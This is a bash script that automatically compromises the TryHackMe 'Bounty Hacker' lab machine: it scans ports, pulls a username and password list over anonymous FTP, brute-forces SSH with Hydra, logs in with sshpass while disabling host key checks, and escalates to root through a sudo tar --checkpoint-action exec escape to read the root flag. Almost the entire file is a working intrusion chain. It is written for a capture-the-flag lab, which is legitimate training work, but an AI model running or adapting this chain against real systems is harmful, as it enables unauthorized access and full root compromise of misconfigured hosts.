#!/usr/bin/env bash
# ============================================================
#  Bounty Hacker — TryHackMe Full Auto-Pwn
#  Author  : 0xb0rn3 | 0xbv1
#  Target  : 10.48.146.252
#  Tested  : Arch Linux / BlackArch
# ============================================================

set -euo pipefail

# ── colour helpers ────────────────────────────────────────
RED='\033[1;31m'; GRN='\033[1;32m'; YLW='\033[1;33m'
BLU='\033[1;34m'; CYN='\033[1;36m'; RST='\033[0m'

banner() { echo -e "\n${CYN}[*]${RST} $*"; }
ok()     { echo -e "${GRN}[+]${RST} $*"; }
info()   { echo -e "${YLW}[!]${RST} $*"; }
die()    { echo -e "${RED}[-]${RST} $*"; exit 1; }

# ── config ────────────────────────────────────────────────
TARGET="${1:-10.48.146.252}"
OUTDIR="$(pwd)/bounty_hacker_results"
LOOT="$OUTDIR/loot"

mkdir -p "$OUTDIR" "$LOOT"
cd "$OUTDIR"

check_deps() {
    banner "Checking dependencies..."
    local deps=(nmap ftp hydra sshpass)
    for d in "${deps[@]}"; do
        command -v "$d" &>/dev/null || die "Missing dependency: $d  (pacman -S $d)"
    done
    ok "All dependencies present"
}

# ── PHASE 1 — Recon ──────────────────────────────────────
phase_recon() {
    banner "PHASE 1 — Nmap full-port scan (--min-rate 5000, -Pn)"
    nmap -sV -sC -T4 -p- --min-rate 5000 -Pn "$TARGET" \
         -oN nmap_full.txt 2>&1

    open_ports=$(grep "^[0-9]" nmap_full.txt | awk '{print $1, $3}')
    ok "Open ports:\n$open_ports"
}

# ── PHASE 2 — FTP anonymous enum ─────────────────────────
phase_ftp() {
    banner "PHASE 2 — FTP anonymous login → file extraction"
    ftp -n -v "$TARGET" <<EOF 2>&1 | tee ftp_session.txt
open $TARGET
user anonymous ""
binary
get task.txt $LOOT/task.txt
get locks.txt $LOOT/locks.txt
bye
EOF

    [[ -f "$LOOT/task.txt"  ]] || die "task.txt not downloaded"
    [[ -f "$LOOT/locks.txt" ]] || die "locks.txt not downloaded"

    TASK_AUTHOR=$(grep -o '\-.*' "$LOOT/task.txt" | tr -d '-' | xargs)
    ok "Task author : $TASK_AUTHOR"
    ok "Wordlist    : $LOOT/locks.txt ($(wc -l < "$LOOT/locks.txt") entries)"
}

# ── PHASE 3 — SSH brute-force ────────────────────────────
phase_brute() {
    banner "PHASE 3 — Hydra SSH brute-force (user: $TASK_AUTHOR, 16 threads)"
    hydra -l "$TASK_AUTHOR" -P "$LOOT/locks.txt" \
          ssh://"$TARGET" -t 16 -f -V \
          2>&1 | tee hydra_ssh.txt

    SSH_PASS=$(grep "\[22\]\[ssh\]" hydra_ssh.txt | grep -oP 'password: \K\S+')
    [[ -n "$SSH_PASS" ]] || die "Hydra found no valid password"
    ok "SSH credentials — $TASK_AUTHOR : $SSH_PASS"
}

# ── helper: run command over SSH ─────────────────────────
ssh_exec() {
    sshpass -p "$SSH_PASS" \
        ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -q "$TASK_AUTHOR@$TARGET" "$@" 2>/dev/null
}

# ── PHASE 4 — User flag ──────────────────────────────────
phase_user_flag() {
    banner "PHASE 4 — Grabbing user flag"
    USER_FLAG=$(ssh_exec 'cat $(find /home -name user.txt 2>/dev/null | head -1)')
    [[ -n "$USER_FLAG" ]] || die "user.txt not found on target"
    echo "$USER_FLAG" > "$LOOT/user.txt"
    ok "user.txt → $USER_FLAG"
}

# ── PHASE 5 — Privilege escalation (sudo tar GTFOBins) ───
phase_privesc() {
    banner "PHASE 5 — Privilege escalation via sudo /bin/tar"
    info "Checking sudo rights..."
    SUDO_OUTPUT=$(echo "$SSH_PASS" | ssh_exec 'sudo -S -l 2>&1')
    echo "$SUDO_OUTPUT"

    if ! echo "$SUDO_OUTPUT" | grep -q '/bin/tar'; then
        die "tar not in sudo list — check manually"
    fi

    ROOT_FLAG=$(echo "$SSH_PASS" | \
        sshpass -p "$SSH_PASS" \
        ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -q "$TASK_AUTHOR@$TARGET" \
        'echo "'"$SSH_PASS"'" | sudo -S tar -cf /dev/null /dev/null \
            --checkpoint=1 \
            --checkpoint-action=exec="sh -c \"cat /root/root.txt\""' 2>/dev/null \
        | grep -v "Removing leading" | tail -1)

    [[ -n "$ROOT_FLAG" ]] || die "root.txt not captured"
    echo "$ROOT_FLAG" > "$LOOT/root.txt"
    ok "root.txt  → $ROOT_FLAG"
}

# ── Summary ───────────────────────────────────────────────
summary() {
    echo ""
    echo -e "${CYN}╔══════════════════════════════════════════════╗${RST}"
    echo -e "${CYN}║        BOUNTY HACKER — RESULTS               ║${RST}"
    echo -e "${CYN}╠══════════════════════════════════════════════╣${RST}"
    echo -e "${CYN}║${RST} Target      : ${YLW}$TARGET${RST}"
    echo -e "${CYN}║${RST} Task author : ${YLW}${TASK_AUTHOR:-unknown}${RST}"
    echo -e "${CYN}║${RST} Brute svc   : ${YLW}SSH (port 22)${RST}"
    echo -e "${CYN}║${RST} Password    : ${YLW}${SSH_PASS:-unknown}${RST}"
    echo -e "${CYN}║${RST} user.txt    : ${GRN}$(cat "$LOOT/user.txt" 2>/dev/null || echo '?')${RST}"
    echo -e "${CYN}║${RST} root.txt    : ${RED}$(cat "$LOOT/root.txt" 2>/dev/null || echo '?')${RST}"
    echo -e "${CYN}╚══════════════════════════════════════════════╝${RST}"
    echo ""
    ok "All loot saved to: $LOOT/"
}

# ── Main ──────────────────────────────────────────────────
main() {
    echo -e "${RED}"
    echo "  ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗"
    echo "  ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝"
    echo "  ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ "
    echo "  ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  "
    echo "  ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   "
    echo "  ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝  "
    echo "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗       "
    echo "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗      "
    echo "  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝      "
    echo "  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗      "
    echo "  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║      "
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     "
    echo -e "${RST}  by ${YLW}0xb0rn3${RST}\n"

    check_deps
    phase_recon
    phase_ftp
    phase_brute
    phase_user_flag
    phase_privesc
    summary
}

main "$@"
